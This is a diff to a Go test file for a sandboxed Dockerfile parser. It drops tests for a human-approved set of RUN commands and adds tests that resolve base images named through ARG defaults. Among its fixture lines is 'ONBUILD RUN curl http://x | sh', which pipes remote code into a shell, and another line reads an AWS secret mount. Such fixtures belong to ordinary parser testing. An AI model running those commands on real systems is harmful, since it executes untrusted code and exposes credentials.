@@ -2,6 +2,7 @@ package sandbox
 
 import (
 	"errors"
+	"fmt"
 	"strings"
 	"testing"
 )
@@ -24,8 +25,8 @@ func refusedLine(t *testing.T, err error, wantLine int) *BuildFileError {
 	return bfErr
 }
 
-// The guest never pulls, so this reading has to be complete: every stage's base and every `--from` naming an image,
-// in file order, once each.
+// The host must fetch every image the build needs, so this reading has to be complete: every stage's base and
+// every `--from` naming an image, in file order, once each.
 func TestBuildReadsEveryImageTheFileNames(t *testing.T) {
 	file, err := ParseBuildFile(strings.Join([]string{
 		"FROM golang:1.23 AS build",
@@ -44,7 +45,7 @@ func TestBuildReadsEveryImageTheFileNames(t *testing.T) {
 		t.Errorf("bases = %v, want %v", file.Bases, want)
 	}
 	if file.FirstFrom != "golang:1.23" {
-		t.Errorf("the headline base is %q, want the file's first FROM as written", file.FirstFrom)
+		t.Errorf("the headline base is %q, want the file's first FROM", file.FirstFrom)
 	}
 }
 
@@ -59,9 +60,8 @@ func TestBuildHandsInEachImageOnce(t *testing.T) {
 	}
 }
 
-// Every line this test parses is one MIKE used to refuse, and they are accepted now because the sandbox and the
-// nested builder already handle what each could do (docs/adr/0002). Refusing them blocked working Dockerfiles
-// and changed nothing about safety.
+// The sandbox and the nested builder already limit each line this test parses, so MIKE does not refuse it
+// (docs/adr/0002).
 func TestBuildAcceptsInstructionsTheSandboxAlreadyLimits(t *testing.T) {
 	file, err := ParseBuildFile(strings.Join([]string{
 		"FROM alpine:3.20",
@@ -78,15 +78,10 @@ func TestBuildAcceptsInstructionsTheSandboxAlreadyLimits(t *testing.T) {
 		"RUN --mount=type=cache,target=/root/.cache make",
 		"RUN --mount=type=secret,id=aws cat /run/secrets/aws",
 		"RUN --network=host true",
+		"ONBUILD RUN curl http://x | sh",
 	}, "\n"))
 	if err != nil {
 		t.Fatalf("refused a file the nested builder handles: %v", err)
-	}
-	runs := strings.Join(file.Runs, "|")
-	for _, want := range []string{"make", "cat /run/secrets/aws", "true"} {
-		if !strings.Contains(runs, want) {
-			t.Errorf("the approved command set is missing %q: %v", want, file.Runs)
-		}
 	}
 	// Only the one `--from` names an image MIKE has to hand in; the stage index and the absolute path do not.
 	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
@@ -106,47 +101,120 @@ func TestBuildReadsAStageIndexAsAStage(t *testing.T) {
 	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY --from=3 /x /y\n"), 2)
 }
 
-// A person approves the command set. An `ONBUILD RUN` runs — in a later build that uses this image — and a
-// `SHELL` changes what every command in the set means, so both belong to what was approved.
-func TestRunSetCoversWhatRunsLaterAndTheShellThatRunsIt(t *testing.T) {
-	plain, err := ParseBuildFile("FROM alpine:3.20\nRUN make\n")
+// The builder expands a `$NAME` in `FROM` from the `ARG` defaults the file itself declares, and MIKE hands over no
+// build args of its own — so resolving the same way is the only way to know what to fetch.
+func TestBuildResolvesABaseNamedByABuildArg(t *testing.T) {
+	file, err := ParseBuildFile(strings.Join([]string{
+		"ARG BASE_IMAGE=registry.access.redhat.com/ubi10/ubi:10.1",
+		"FROM ${BASE_IMAGE}",
+		"ARG REMI_RELEASE_RPM=https://rpms.remirepo.net/enterprise/remi-release-10.rpm",
+		"RUN dnf -y --enablerepo=remi install nginx",
+	}, "\n"))
 	if err != nil {
-		t.Fatal(err)
+		t.Fatalf("refused a file it must build: %v", err)
 	}
-	withOnbuild, err := ParseBuildFile("FROM alpine:3.20\nRUN make\nONBUILD RUN curl http://x | sh\n")
-	if err != nil {
-		t.Fatalf("refused a file it must pass: %v", err)
+	if len(file.Bases) != 1 || file.Bases[0] != "registry.access.redhat.com/ubi10/ubi:10.1" {
+		t.Errorf("bases = %v, want the ref the ARG default names", file.Bases)
 	}
-	if !strings.Contains(strings.Join(withOnbuild.Runs, "|"), "curl http://x | sh") {
-		t.Errorf("an ONBUILD RUN was left out of the set a person approves: %v", withOnbuild.Runs)
-	}
-	if plain.RunSetHash() == withOnbuild.RunSetHash() {
-		t.Error("a command added to the build did not change the set hash")
-	}
-
-	withShell, err := ParseBuildFile("FROM alpine:3.20\nSHELL [\"/bin/bash\", \"-c\"]\nRUN make\n")
-	if err != nil {
-		t.Fatalf("refused a file it must pass: %v", err)
-	}
-	if withShell.RunSetHash() == plain.RunSetHash() {
-		t.Error("changing the shell did not change the set hash, though it changes what `make` runs")
+	if file.FirstFrom != "registry.access.redhat.com/ubi10/ubi:10.1" {
+		t.Errorf("the headline base is %q, want the resolved ref", file.FirstFrom)
 	}
 }
 
-// `--platform` is the one flag refusal left, and it is about honesty: the host hands in what this host has, so
-// another architecture would silently become this one.
+// A ref composed from more than one arg, a default built from an earlier default, a last declaration winning,
+// the bare `$NAME` spelling, and a `--from` naming an image the same way.
+func TestBuildResolvesAComposedBaseRef(t *testing.T) {
+	file, err := ParseBuildFile(strings.Join([]string{
+		"ARG REGISTRY=registry.example.com",
+		"ARG NS=team",
+		"ARG TAG=1.36",
+		"ARG BASE=${REGISTRY}/${NS}/tool:${TAG}",
+		"ARG BASE=${REGISTRY}/${NS}/tool:1.40",
+		"FROM $BASE AS tools",
+		"FROM docker.io/library/busybox:1.36",
+		"COPY --from=${BASE} /bin/sh /bin/sh",
+	}, "\n"))
+	if err != nil {
+		t.Fatalf("refused a file it must build: %v", err)
+	}
+	want := "registry.example.com/team/tool:1.40"
+	if strings.Join(file.Bases, ",") != want+",docker.io/library/busybox:1.36" {
+		t.Errorf("bases = %v, want the composed ref then the busybox stage, each once", file.Bases)
+	}
+	if file.FirstFrom != want {
+		t.Errorf("the headline base is %q, want %q", file.FirstFrom, want)
+	}
+}
+
+// An `ARG` written inside a stage cannot name a base: the builder scopes it the same way, measured on both engines.
+func TestBuildTakesNoBaseFromAStageScopedArg(t *testing.T) {
+	refusedLine(t, parseErrorOf(strings.Join([]string{
+		"FROM docker.io/library/busybox:1.36",
+		"ARG BASE=alpine:3.20",
+		"FROM ${BASE}",
+	}, "\n")), 3)
+}
+
+// A name the file never gave a value is still a refusal: MIKE cannot fetch what has no name, and it hands the
+// builder no build arg that could give it one.
+func TestBuildRefusesABaseNameItCannotResolve(t *testing.T) {
+	// Declared, no default.
+	refusedLine(t, parseErrorOf("ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\n"), 2)
+	// Never declared at all.
+	err := refusedLine(t, parseErrorOf("FROM $BASE_IMAGE\nRUN make\n"), 1)
+	if !strings.Contains(err.Reason, "BASE_IMAGE") {
+		t.Errorf("the refusal does not name the variable: %v", err)
+	}
+	// An empty default expands to nothing, which is not an image.
+	refusedLine(t, parseErrorOf("ARG BASE_IMAGE=\nFROM ${BASE_IMAGE}\n"), 2)
+	// A form beyond a plain name is the builder's own expansion, which MIKE would have to guess at.
+	refusedLine(t, parseErrorOf("ARG REG=registry.example.com\nFROM ${REG:-docker.io}/app:1\n"), 2)
+	// A default that refers to itself never settles.
+	refusedLine(t, parseErrorOf("ARG BASE=${BASE}\nFROM ${BASE}\n"), 2)
+	// Doubling defaults compose past the length bound; each name is distinct, so no cycle catches it.
+	doubling := []string{"ARG A0=x"}
+	for i := 1; i < 40; i++ {
+		doubling = append(doubling, fmt.Sprintf("ARG A%d=${A%d}${A%d}", i, i-1, i-1))
+	}
+	refusedLine(t, parseErrorOf(strings.Join(append(doubling, "FROM ${A39}"), "\n")), 41)
+	// The same rule guards a `--from` naming an image.
+	refusedLine(t, parseErrorOf("FROM docker.io/library/busybox:1.36\nCOPY --from=${OTHER} /x /y\n"), 2)
+}
+
+// A default is expanded only when a base asks for it, so an `ARG` no `FROM` names cannot refuse a build.
+func TestBuildIgnoresABuildArgNoBaseAsksFor(t *testing.T) {
+	if _, err := ParseBuildFile("ARG BROKEN=${NOPE}\nFROM docker.io/library/busybox:1.36\n"); err != nil {
+		t.Errorf("refused a file over an arg no base names: %v", err)
+	}
+}
+
+// A `--from` that expands to a stage of the same file is still a stage, not an image to fetch: the check runs
+// again after the expansion.
+func TestBuildTakesNoBaseFromACopyArgNamingAStage(t *testing.T) {
+	file, err := ParseBuildFile(strings.Join([]string{
+		"ARG STAGE=build",
+		"ARG IDX=0",
+		"FROM docker.io/library/busybox:1.36 AS build",
+		"FROM docker.io/library/alpine:3.20",
+		"COPY --from=${STAGE} /x /y",
+		"COPY --from=${IDX} /x /y",
+	}, "\n"))
+	if err != nil {
+		t.Fatalf("refused a file it must pass: %v", err)
+	}
+	want := []string{"docker.io/library/busybox:1.36", "docker.io/library/alpine:3.20"}
+	if strings.Join(file.Bases, ",") != strings.Join(want, ",") {
+		t.Errorf("bases = %v, want %v", file.Bases, want)
+	}
+}
+
+// `--platform` is one of the two refusals left: the host pulls, so the build gets this host's architecture and a
+// different one would silently become this one.
 func TestBuildRefusesAPlatformItCannotHandIn(t *testing.T) {
 	err := refusedLine(t, parseErrorOf("FROM alpine:3.20\nFROM --platform=linux/arm64 alpine:3.20\n"), 2)
 	if !strings.Contains(err.Reason, "platform") {
 		t.Errorf("the refusal does not name the platform: %v", err)
 	}
-}
-
-// MIKE fetches each named image by name, so a `$VAR` cannot be one. A `$VAR` is expanded by the builder, so
-// checking a string nobody will execute would be theatre.
-func TestBuildRefusesAnImageNamedByAVariable(t *testing.T) {
-	refusedLine(t, parseErrorOf("FROM $BASE\nRUN make\n"), 1)
-	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY --from=$OTHER /x /y\nRUN make\n"), 2)
 }
 
 func TestBuildRefusesAnEscapeDirectiveThatMovesTheContinuation(t *testing.T) {
@@ -161,53 +229,16 @@ func TestBuildJoinsContinuationsAndKeepsTheStartingLine(t *testing.T) {
 	if err != nil {
 		t.Fatalf("refused a file it must pass: %v", err)
 	}
-	if len(file.Runs) != 1 || file.Runs[0] != "make -j4 install" {
-		t.Errorf("the joined command is %v, want one line", file.Runs)
+	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
+		t.Errorf("the joined line broke the read: %v", file.Bases)
 	}
-	_, err = ParseBuildFile("FROM alpine:3.20\nENV A=1\n\n# a comment\nRUN  make\n")
-	if err != nil {
+	if _, err = ParseBuildFile("FROM alpine:3.20\nENV A=1\n\n# a comment\nRUN  make\n"); err != nil {
 		t.Errorf("blanks and comments broke the read: %v", err)
 	}
 }
 
-// The command text is the approved set verbatim: re-quoting it would let a changed command look unchanged.
-func TestRunTextIsWrittenAsItWas(t *testing.T) {
-	file, err := ParseBuildFile("FROM alpine:3.20\nRUN echo \"a  b\" && echo 'c'\n")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if file.Runs[0] != `echo "a  b" && echo 'c'` {
-		t.Errorf("the command was rewritten to %q", file.Runs[0])
-	}
-}
-
-func TestRunSetHashTracksOrderAndContent(t *testing.T) {
-	a, err := ParseBuildFile("FROM alpine:3.20\nRUN one\nRUN two\n")
-	if err != nil {
-		t.Fatal(err)
-	}
-	b, err := ParseBuildFile("FROM alpine:3.20\nRUN two\nRUN one\n")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if a.RunSetHash() == b.RunSetHash() {
-		t.Error("reordering the steps kept the hash")
-	}
-	c, err := ParseBuildFile("FROM alpine:3.20\nRUN one; two\n")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if a.RunSetHash() == c.RunSetHash() {
-		t.Error("joining two steps into one kept the hash")
-	}
-	if len(a.RunSetHash()) != 64 {
-		t.Errorf("the hash is %q, want hex sha256", a.RunSetHash())
-	}
-}
-
-func TestBuildRefusesUnclosedQuoteAndEmptyRun(t *testing.T) {
+func TestBuildRefusesUnclosedQuote(t *testing.T) {
 	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY 'unclosed /x\n"), 2)
-	refusedLine(t, parseErrorOf("FROM alpine:3.20\nRUN\n"), 2)
 }
 
 // A file with no `FROM` has no base, so there is nothing to hand in and nothing to record provenance
